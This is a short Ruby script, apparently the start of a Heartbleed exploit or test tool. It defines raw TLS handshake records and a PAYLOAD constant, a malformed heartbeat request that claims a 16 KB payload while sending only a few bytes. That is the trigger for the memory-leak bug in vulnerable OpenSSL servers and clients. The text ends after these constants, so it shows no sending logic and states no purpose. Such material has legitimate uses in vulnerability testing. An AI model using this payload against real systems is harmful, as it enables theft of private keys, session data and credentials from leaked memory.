#!/usr/bin/env ruby

require 'socket'
require 'timeout'
require 'openssl'

module ContentType
  ALERT = "\x15"
  HEARTBLEED = "\x18"
end

def decode_hex(s)
  [s.split(/\s/).join("")].pack('H*')
end

CLIENT_HELLO = decode_hex <<-EOS
16 03 01 00 38 01 00 00 34 03
01 23 18 50 c0 c7 9d 32 9f 90
63 de 32 12 14 1f 8c eb f1 a4
45 2b fd cc 12 87 ca db 32 b5
96 86 16 00 00 06 00 0a 00 2f
00 35 01 00 00 05 00 0f 00 01
01
EOS

SERVER_HELLO = decode_hex <<-EOS
16 03 01 00 31 02 00 00 2d 03
01 23 18 50 c0 c7 9d 32 9f 90
63 de 32 12 14 1f 8c eb f1 a4
45 2b fd cc 12 87 ca db 32 b5
96 86 16 00 00 05 00 00 05 00
0f 00 01 01
EOS

SERVER_HELLO_DONE = "\x0e\x00\x00\x00"

PAYLOAD =  "\x18\x03\x01\x00\x03\x01\x40\x00"
